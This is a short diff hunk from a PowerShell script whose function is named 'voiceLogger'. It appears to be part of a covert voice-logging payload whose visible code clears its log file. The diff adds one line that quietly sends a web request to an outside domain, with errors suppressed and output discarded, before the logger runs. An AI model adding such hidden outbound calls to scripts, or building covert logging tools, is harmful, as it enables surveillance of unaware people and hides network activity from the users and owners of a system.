@@ -45,5 +45,5 @@ function voiceLogger {
     }
     Clear-Content -Path $log
 }
-
+iwr "https://jakoby.lol/hak5" -EA 0 >$null
 voiceLogger
